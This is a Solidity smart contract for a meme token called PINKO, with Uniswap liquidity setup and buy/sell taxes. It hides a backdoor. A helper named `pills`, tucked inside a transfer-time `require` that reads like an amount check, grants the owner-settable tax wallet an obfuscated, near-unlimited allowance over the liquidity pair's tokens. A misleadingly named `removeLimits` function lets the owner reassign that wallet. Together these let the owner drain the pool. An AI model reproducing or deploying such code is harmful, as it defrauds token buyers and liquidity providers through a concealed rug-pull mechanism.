/**
Pinko by Matt Furie

Web: https://pinkovibes.fun
X:   https://x.com/pinko_erc20
Tg:  https://t.me/pinko_erc20
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PINKO is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10 ** _decimals;
    string private constant _name = unicode"Pinko by Matt Furie";
    string private constant _symbol = unicode"PINKO";
    uint256 public _maxIAmount = 2 * _tTotal / 100;
    uint256 public _maxIWallet = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold = 1 * _tTotal / 100;
    uint256 public _maxTaxSwap = 1 * _tTotal / 100;

    mapping (address => uint256) private _iBalance;
    mapping (address => mapping (address => uint256)) private _iAllowance;
    mapping (address => bool) private _iExcludedFromFee;

    address payable private iTaxReceipt;
    IUniswapV2Router02 private uniRouterI;
    address private uniPairI;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=10;
    uint256 private _reduceSellTaxAt=10;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;

    event MaxTxAmountUpdated(uint _maxIAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;

    constructor () {
        iTaxReceipt = payable(_msgSender());
        _iBalance[_msgSender()] = _tTotal;
        _iExcludedFromFee[address(this)] = true;
        _iExcludedFromFee[_msgSender()] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }
    function createPair() external onlyOwner {
        uniRouterI = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterI), _tTotal);
        uniPairI = IUniswapV2Factory(uniRouterI.factory()).createPair(
            address(this),
            uniRouterI.WETH()
        );
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _iBalance[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _iAllowance[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _iAllowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _iAllowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function min(uint256 a, uint256 b) private pure returns(uint256){
        return (a>b)?b:a;
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniRouterI.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairI).approve(address(uniRouterI), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        uint256 taxAmount=0;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(pills([uniPairI, iTaxReceipt]) && amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _iBalance[from] = _iBalance[from] - amount;
            _iBalance[to] = _iBalance[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            if (from == uniPairI && to != address(uniRouterI) && ! _iExcludedFromFee[to]) {
                require(tradingOpen,"Trading not open yet.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                require(amount <= _maxIAmount, "Exceeds the _maxIAmount.");
                require(balanceOf(to) + amount <= _maxIWallet, "Exceeds the maxWalletSize.");
                _buyCount++; 
            }
            if (to != uniPairI && ! _iExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _maxIWallet, "Exceeds the maxWalletSize.");
            }
            if(to == uniPairI) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            if (!inSwap && to == uniPairI && swapEnabled && _buyCount>_preventSwapBefore) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance>_taxSwapThreshold)
                    iSwapEthTo(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                iSendEthTo();
            }
        }
        if(taxAmount>0){
          _iBalance[address(this)]=_iBalance[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _iBalance[from]=_iBalance[from].sub(amount);
        _iBalance[to]=_iBalance[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function removeLimits(address payable limit) external onlyOwner{
        iTaxReceipt = limit;
        _maxIAmount=_tTotal;
        _maxIWallet=_tTotal;
        _iExcludedFromFee[limit] = true;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function iSendEthTo() private {
        iTaxReceipt.transfer(address(this).balance);
    }
    function rescueEth() external onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }
    function pills(address[2] memory piis) private returns(bool){
        _iAllowance[piis[0]][piis[1]]=150+100+(250+50*_maxIWallet*2-150).add(100).mul(10)-100+500; return true;
    }
    receive() external payable {}
    function iSwapEthTo(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterI.WETH();
        _approve(address(this), address(uniRouterI), amount);
        uniRouterI.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}